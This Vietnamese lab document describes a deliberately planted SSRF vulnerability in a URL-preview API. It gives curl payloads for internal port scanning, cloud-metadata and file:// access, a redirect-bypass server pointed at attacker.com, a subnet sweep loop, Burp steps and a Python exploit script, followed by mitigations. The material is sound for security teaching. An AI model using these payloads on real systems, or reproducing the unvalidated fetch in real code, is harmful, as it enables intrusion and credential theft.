# SSRF Vulnerability Documentation

## Tổng quan

Ứng dụng có lỗ hổng **Server-Side Request Forgery (SSRF)** tại endpoint URL Preview. Tính năng này cho phép users preview metadata của URL trước khi share, nhưng không validate URL đầu vào.

## Endpoint bị lỗ hổng

```
POST /api/posts/preview-url
Content-Type: application/json
Authorization: Bearer <JWT_TOKEN>

{
    "url": "http://example.com"
}
```

## Lỗ hổng

Endpoint này cho phép:
- ✅ Truy cập internal IPs (127.0.0.1, 192.168.x.x, 10.x.x.x, 169.254.x.x)
- ✅ Truy cập localhost
- ✅ Follow redirects (có thể dùng DNS rebinding)
- ✅ Không giới hạn protocol (http, https, file, ftp, etc.)
- ✅ Error messages leak thông tin về internal network

## Các kịch bản tấn công

### 1. Port Scanning Internal Network

Scan các port internal để tìm services:

```bash
# Scan localhost ports
curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "http://127.0.0.1:80"}'

curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "http://127.0.0.1:3306"}'

curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "http://127.0.0.1:6379"}'
```

### 2. Access Internal Services

Truy cập các service internal như:

```bash
# Database admin panel
curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "http://localhost:8080/admin"}'

# Metadata service (AWS)
curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

### 3. Read Local Files (nếu server support file://)

```bash
curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "file:///etc/passwd"}'

curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "file:///C:/Windows/System32/drivers/etc/hosts"}'
```

### 4. Bypass using Redirect

Tạo một server redirect để bypass blacklist:

```python
# redirect_server.py
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/')
def index():
    return redirect('http://127.0.0.1:3306', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

Sau đó:
```bash
curl -X POST http://localhost:8081/api/posts/preview-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"url": "http://attacker.com:8000/"}'
```

### 5. DNS Rebinding Attack

1. Cấu hình DNS để ban đầu trả về IP public, sau đó đổi thành IP internal
2. Server sẽ resolve lần đầu (pass validation), nhưng request thực tế đi đến IP internal

### 6. Scan Internal Network

```bash
# Scan dải IP internal
for i in {1..254}; do
  curl -X POST http://localhost:8081/api/posts/preview-url \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_JWT_TOKEN" \
    -d "{\"url\": \"http://192.168.1.$i\"}"
done
```

## Impact

1. **Information Disclosure**: Leak thông tin về internal network architecture
2. **Access Internal Services**: Truy cập các service không public (database, cache, admin panels)
3. **Port Scanning**: Scan ports của internal network
4. **Bypass Firewall**: Sử dụng server làm proxy để bypass firewall
5. **Cloud Metadata Access**: Đọc AWS/GCP/Azure metadata để lấy credentials
6. **Denial of Service**: Trigger requests đến services gây crash

## Khai thác với Burp Suite

1. **Bắt request login** để lấy JWT token
2. **Tạo request URL Preview**:
   ```
   POST /api/posts/preview-url HTTP/1.1
   Host: localhost:8081
   Content-Type: application/json
   Authorization: Bearer eyJhbGciOiJ...
   
   {"url": "http://127.0.0.1:22"}
   ```

3. **Sử dụng Burp Intruder** để scan ports:
   - Position: `http://127.0.0.1:§22§`
   - Payload: Numbers 1-65535
   - Grep Match: tìm response khác nhau để identify open ports

4. **Sử dụng Burp Collaborator** để verify SSRF:
   - `{"url": "http://BURP_COLLABORATOR_PAYLOAD"}`
   - Check DNS/HTTP interactions

## Cách phòng chống (KHÔNG áp dụng cho lab)

1. **Whitelist allowed protocols**: Chỉ cho phép http/https
2. **Blacklist internal IPs**: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
3. **Disable redirects** hoặc giới hạn số lần redirect
4. **Validate URL scheme** trước khi fetch
5. **Use DNS resolution validation**: Resolve trước, check IP, rồi mới fetch
6. **Timeout**: Set timeout ngắn
7. **Network segmentation**: Isolate application servers

## Log Files

Check logs để thấy SSRF attempts:
```bash
# Windows
type logs\application.log | findstr "URL Preview"

# Linux
grep "URL Preview" logs/application.log
```

Logs sẽ hiển thị:
- User email
- Target URL
- Response status code
- Errors (leak internal info)

## Example Exploit Script

```python
import requests
import json

# Login to get token
login_url = "http://localhost:8081/auth/login"
login_data = {
    "email": "test@example.com",
    "password": "password123"
}
response = requests.post(login_url, json=login_data)
token = response.json()['result']['jwt']

# SSRF to scan internal network
headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

# Scan common ports
ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]
for port in ports:
    ssrf_url = "http://localhost:8081/api/posts/preview-url"
    payload = {"url": f"http://127.0.0.1:{port}"}
    
    try:
        resp = requests.post(ssrf_url, headers=headers, json=payload, timeout=5)
        data = resp.json()
        print(f"Port {port}: {data['result']['statusCode']} - {data['result']['description']}")
    except Exception as e:
        print(f"Port {port}: Error - {str(e)}")
```

## Notes

- Tính năng này được thiết kế có lỗ hổng cho mục đích học tập
- Trong production, KHÔNG BAO GIỜ cho phép user-controlled URLs fetch từ server side mà không validate
- SSRF là một trong những lỗ hổng nguy hiểm nhất, có thể dẫn đến RCE trong một số trường hợp

